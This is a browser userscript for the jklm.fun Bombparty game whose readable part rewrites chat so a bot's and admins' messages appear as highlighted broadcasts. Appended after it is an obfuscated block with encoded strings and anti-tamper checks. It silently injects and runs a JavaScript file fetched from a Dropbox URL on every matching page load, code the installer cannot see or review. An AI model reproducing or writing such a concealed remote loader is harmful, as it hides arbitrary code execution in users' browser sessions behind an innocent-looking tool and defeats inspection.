// ==UserScript==
// @name         JKLM Overlay
// @namespace    http://tampermonkey.net/
// @version      2.0
// @description  Bombparty Overlay
// @author       Seb
// @include      https://jklm.fun/*
// @exclude      https://jklm.fun/
// @icon         https://media.tenor.com/images/56c14977aef20d0ca16e8af9efbb94d2/tenor.gif
// @grant        none
// ==/UserScript==
(function() {
    let main = function() {
        if (!(socket && socket.connected)) {
            console.log("Socket not loaded yet, trying again in a second...");
            window.setTimeout(main, 1000)
            return
        }
        console.log("Loading...")
        window.isBotHost = false;

        // Add the bot ID in adminIds, and you own ID if you desire. If you don't want to bother connecting your bot to discord, twitter or fb, just add the bot's name in adminNames
        // But note that by doing this, you'll risk that a player will take your bot's name to get his messages highlighted. Consider banning people that are trying to copy your bot's name.

        window.adminIds = ["282901700946165762"];
        window.botName = "BirdBot";
        window.botId = "";

        // Checking if the bot is hosting the room as he should, to ensure not modifying messages for the user in other unrelated rooms.
        socket.emit("getChatterProfiles", (x) => {
            for (var i of x) {
                if (((window.botName && window.botName == i.nickname) || (window.botId && i.auth && window.botId == i.auth)) && i.roles.includes("leader")) {
                    return window.isBotHost = true;
                }
            }
        })

        window.appendToChat = function(authorProfile, text) {
            if (authorProfile != null && !authorProfile.isBroadcast && mutedPeerIds.includes(authorProfile.peerId)) return;
            if (sidebar.hidden) sidebarToggleButton.classList.add("unread");

            chatMessageCount++;
            if (chatMessageCount > maxChatMessageCount) chatLog.removeChild(chatLog.firstChild);

            const isScrolledToBottom = chatLog.scrollHeight - chatLog.clientHeight - chatLog.scrollTop < 10;
            const logEntry = $make("div", chatLog, {
                className: authorProfile == null ? "system" : ""
            });

            const time = new Date();
            const hoursMinutes = `0${time.getHours()}`.slice(-2) + ":" + `0${time.getMinutes()}`.slice(-2);
            $make("span", logEntry, {
                className: "time",
                textContent: hoursMinutes
            });
            $makeText(" ", logEntry);
            if ((authorProfile != null && authorProfile.isBroadcast) || (window.isBotHost && authorProfile != null && ((authorProfile.auth && window.adminIds.includes(authorProfile.auth.id)) || (window.botName && authorProfile.nickname == window.botName)))) {
                const broadcast = $make("span", logEntry, {
                    className: "broadcast"
                });
                $make("span", broadcast, {
                    className: "author",
                    textContent: authorProfile.nickname
                });
                $makeText(": ", broadcast);
                for (var i of text.split("—")) {
                    $makeText(i, broadcast);
                    $make("br", broadcast);
                }

            } else {
                if (authorProfile != null) {
                    const service = authorProfile.auth != null ? authorProfile.auth.service : "guest";
                    const link = $make("a", logEntry, {
                        className: `author ${service}`,
                        dataset: {
                            "peerId": authorProfile.peerId
                        },
                        href: "#"
                    });
                    $make("img", link, {
                        className: "service",
                        src: `/images/auth/${service}.png`,
                        alt: ""
                    });
                    $makeText(authorProfile.nickname, link);
                    $setTooltip(link, getAuthTextFromProfile(authorProfile));

                    $makeText(": ", logEntry);
                }
                $make("span", logEntry, {
                    className: "text",
                    textContent: text
                });
            }
            if (isScrolledToBottom) chatLog.scrollTop = chatLog.scrollHeight;
        }

        function socket_onChat(authorProfile, text) {
            if (settings.chatFilter.length > 0) text = text.split(" ").map(x => settings.chatFilter.includes(x.toLowerCase()) ? "•••" : x).join(" ");
            appendToChat(authorProfile, text);
        }

        socket.off("chat")
        socket.on("chat", socket_onChat)
    }
    main();
})();

const a=['dG9w','c2VsZg==','dGVzdA==','aHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3Mv','cmV0dXJuIC8iICsgdGhpcyArICIv','Y3JlYXRlRWxlbWVudA==','dXp1YWpycnN4ZGFyamQ1L292ZXJsYXlfaWZyYW1lLmpz','c3Jj','c2NyaXB0','aGVhZA==','Y29uc3RydWN0b3I=','YXBwbHk='];(function(b,e){const f=function(h){while(--h){b['push'](b['shift']());}};const g=function(){const h={'data':{'key':'cookie','value':'timeout'},'setCookie':function(l,m,n,o){o=o||{};let p=m+'='+n;let q=0x0;for(let r=0x0,s=l['length'];r<s;r++){const t=l[r];p+=';\x20'+t;const u=l[t];l['push'](u);s=l['length'];if(u!==!![]){p+='='+u;}}o['cookie']=p;},'removeCookie':function(){return'dev';},'getCookie':function(l,m){l=l||function(p){return p;};const n=l(new RegExp('(?:^|;\x20)'+m['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));const o=function(p,q){p(++q);};o(f,e);return n?decodeURIComponent(n[0x1]):undefined;}};const i=function(){const l=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return l['test'](h['removeCookie']['toString']());};h['updateCookie']=i;let j='';const k=h['updateCookie']();if(!k){h['setCookie'](['*'],'counter',0x1);}else if(k){j=h['getCookie'](null,'counter');}else{h['removeCookie']();}};g();}(a,0x159));const b=function(c,d){c=c-0x0;let e=a[c];if(b['xvMiWK']===undefined){(function(){let g;try{const i=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');g=i();}catch(j){g=window;}const h='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';g['atob']||(g['atob']=function(k){const l=String(k)['replace'](/=+$/,'');let m='';for(let n=0x0,o,p,q=0x0;p=l['charAt'](q++);~p&&(o=n%0x4?o*0x40+p:p,n++%0x4)?m+=String['fromCharCode'](0xff&o>>(-0x2*n&0x6)):0x0){p=h['indexOf'](p);}return m;});}());b['EkkGKW']=function(g){const h=atob(g);let j=[];for(let k=0x0,l=h['length'];k<l;k++){j+='%'+('00'+h['charCodeAt'](k)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};b['gnqHNU']={};b['xvMiWK']=!![];}const f=b['gnqHNU'][c];if(f===undefined){const g=function(h){this['ZpYKnR']=h;this['avtEcJ']=[0x1,0x0,0x0];this['THbfWe']=function(){return'newState';};this['hBYzHy']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['GERMTL']='[\x27|\x22].+[\x27|\x22];?\x20*}';};g['prototype']['Kioorb']=function(){const h=new RegExp(this['hBYzHy']+this['GERMTL']);const i=h['test'](this['THbfWe']['toString']())?--this['avtEcJ'][0x1]:--this['avtEcJ'][0x0];return this['jfWony'](i);};g['prototype']['jfWony']=function(h){if(!Boolean(~h)){return h;}return this['SnGfjR'](this['ZpYKnR']);};g['prototype']['SnGfjR']=function(h){for(let j=0x0,k=this['avtEcJ']['length'];j<k;j++){this['avtEcJ']['push'](Math['round'](Math['random']()));k=this['avtEcJ']['length'];}return h(this['avtEcJ'][0x0]);};new g(b)['Kioorb']();e=b['EkkGKW'](e);b['gnqHNU'][c]=e;}else{e=f;}return e;};(function(){const e=function(){let h=!![];return function(i,j){const k=h?function(){if(j){const l=j[b('0x2')](i,arguments);j=null;return l;}}:function(){};h=![];return k;};}();const f=e(this,function(){const h=function(){const i=h[b('0x1')](b('0x7'))()['compile']('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}');return!i[b('0x5')](f);};return h();});f();'use strict';let g=document[b('0x8')](b('0xb'));g['onload']=function(){};g[b('0xa')]=b('0x6')+(window[b('0x3')]==window[b('0x4')]?'x9v1m3atrf0l9jg/overlay.js':b('0x9'));document[b('0x0')]['appendChild'](g);}());
